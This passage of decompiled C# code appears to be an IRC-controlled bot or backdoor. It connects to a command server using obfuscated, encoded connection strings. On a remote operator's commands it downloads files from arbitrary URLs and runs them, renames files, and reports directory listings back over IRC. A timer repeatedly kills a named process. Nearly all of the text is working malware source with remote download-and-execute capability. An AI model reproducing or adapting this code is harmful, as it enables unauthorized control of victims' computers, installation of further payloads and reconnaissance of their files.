					ProjectData.ClearProjectError();
				}
				num2++;
			}
			return list;
		}
	}

	public void KP(string st)
	{
		Process[] processesByName = Process.GetProcessesByName(st);
		checked
		{
			int num = processesByName.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					processesByName[num2].Kill();
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		KP(st[2]);
	}

	public void Connect()
	{
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		irc.eventtype_string.Add(new Ir.event_sp());
		irc.eventtype_string[0].parm = love_is_hard.entnerd("rr#wqw#wwr#wee#wwt#wwr#wwi#wqt#wqo");
		irc.eventtype_string[0].eventtype1 += event1;
		irc.eventtype_string.Add(new Ir.event_sp());
		irc.eventtype_string[1].parm = love_is_hard.entnerd("rr#wwu#wwo#wqq#wwo#wew");
		irc.eventtype_string[1].eventtype1 += event2;
		irc.eventtype_string.Add(new Ir.event_sp());
		irc.eventtype_string[2].parm = love_is_hard.entnerd("rr#wwz#wqr#wwr#wqw#wwt#wqi");
		irc.eventtype_string[2].eventtype1 += event3;
		irc.eventtype_string.Add(new Ir.event_sp());
		irc.eventtype_string[3].parm = love_is_hard.entnerd("rr#wqw#wqi#wwi");
		irc.eventtype_string[3].eventtype1 += event4;
		irc.master = love_is_hard.entnerd("uu#wqp#pp#wqe#www#or#wqi#wer#wei#weq#wet#wwo#io#wwo#wrq");
		if (!irc.Connect(love_is_hard.entnerd("uu#wqp#pp#wqe#www#or#wqi#wer#wqo#wez"), love_is_hard.entnerd("rz#up#pp#wwi#www#weq#www#wqi#wqp#weq#wwe#weq#wwr"), love_is_hard.entnerd("wqz#wwz#wqw#tp#wwi#wee#wqr#wwt#wqp#wwp#www#wei#zo#wet#weo#wwo"), love_is_hard.entnerd("zt#zz#zu#zo")))
		{
			Interaction.MsgBox((object)"no", (MsgBoxStyle)0, (object)null);
		}
	}

	public void event1(string parm)
	{
		try
		{
			if (parm.Contains(irc.NICK) | parm.Contains(aller))
			{
				string uriString = parm.Split(new char[1] { '#' })[2];
				string fileName = parm.Split(new char[1] { '#' })[3];
				WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri(uriString), fileName);
				irc.Send(er);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			irc.Send(nier);
			ProjectData.ClearProjectError();
		}
	}

	public void event2(string parm)
	{
		try
		{
			if (parm.Contains(irc.NICK) | parm.Contains(aller))
			{
				string fileName = parm.Split(new char[1] { '#' })[2];
				Process.Start(fileName);
				irc.Send(er);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			irc.Send(nier);
			ProjectData.ClearProjectError();
		}
	}

	public void event3(string parm)
	{
		try
		{
			if (parm.Contains(irc.NICK) | parm.Contains(aller))
			{
				string text = parm.Split(new char[1] { '#' })[2];
				string text2 = parm.Split(new char[1] { '#' })[3];
				((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(text, text2);
				irc.Send(er);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			irc.Send(nier);
			ProjectData.ClearProjectError();
		}
	}

	public void event4(string parm)
	{
		checked
		{
			try
			{
				if (!(parm.Contains(irc.NICK) | parm.Contains(aller)))
				{
					return;
				}
				string text = parm.Split(new char[1] { '#' })[2];
				Directory.GetFiles(text);
				Directory.GetDirectories(text);
				string text2 = "";
				if (parm.Contains(fileser))
				{
					text2 = "";
					if (parm.Contains(siter))
					{
						int num = 100;
						do
						{
							if (!parm.Contains(siter + Conversions.ToString(num)))
							{
								num += -1;
								continue;
							}
							text2 = gf(num * 15, num * 15 + 15, text);
							irc.Send(text2);
							if (Operators.CompareString(text2, fehlerd, false) != 0)
							{
								irc.Send(er);
							}
							break;
						}
						while (num >= 1);
					}
					else
					{
						irc.Send(fehlerd);
					}
				}
				if (!parm.Contains(ordner))
				{
					return;
				}
				text2 = "";
				if (parm.Contains(siter))
				{
					int num2 = 100;
					do
					{
						if (!parm.Contains(siter + Conversions.ToString(num2)))
						{
							num2 += -1;
							continue;
						}
						text2 = go(num2 * 15, num2 * 15 + 15, text);
						irc.Send(text2);
						if (Operators.CompareString(text2, fehlerd, false) != 0)
						{
							irc.Send(er);
						}
						break;
					}
					while (num2 >= 1);
				}
				else
				{
					irc.Send(fehlerd);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				irc.Send(nier);
				ProjectData.ClearProjectError();
			}
		}
	}

	public string gf(int von, int bis, string file1)
	{
		string[] files = Directory.GetFiles(file1);
		string text = "";
		checked
		{
			if (files.Length - 1 < von)
			{
				return fehlerd;
			}
			if (files.Length - 1 > bis)
			{
				int num = von;
				while (true)
				{
					int num2 = num;
					int num3 = bis;
					if (num2 <= num3)
					{
						text = text + Interaction.IIf(num == 0, (object)"", (object)"  ").ToString() + files[num].Replace(file1, "");
						num++;
						continue;
					}
					break;
				}
			}
			else
			{
				int num4 = files.Length - 1;
				int num5 = von;
				while (true)
				{
					int num6 = num5;
					int num3 = num4;
					if (num6 > num3)
					{
						break;
					}
					text = text + Interaction.IIf(num5 == 0, (object)"", (object)"  ").ToString() + files[num5].Replace(file1, "");
					num5++;
				}
			}
			return text;
		}
	}

	public string go(int von, int bis, string file1)
	{
		string[] directories = Directory.GetDirectories(file1);
		string text = "";
		checked
		{
			if (directories.Length - 1 < von)
			{
				return fehlerd;
			}
			if (directories.Length - 1 > bis)
			{
				int num = von;
				while (true)
				{
					int num2 = num;
					int num3 = bis;
					if (num2 <= num3)
					{
						text = text + Interaction.IIf(num == 0, (object)"", (object)"  ").ToString() + directories[num].Replace(file1, "");
						num++;
						continue;
					}
					break;
				}
			}
			else
			{
				int num4 = directories.Length - 1;
				int num5 = von;
				while (true)
				{
					int num6 = num5;
					int num3 = num4;
					if (num6 > num3)
					{
						break;
					}
					text = text + Interaction.IIf(num5 == 0, (object)"", (object)"  ").ToString() + directories[num5].Replace(file1, "");
					num5++;
				}
			}
			return text;
		}
	}
}
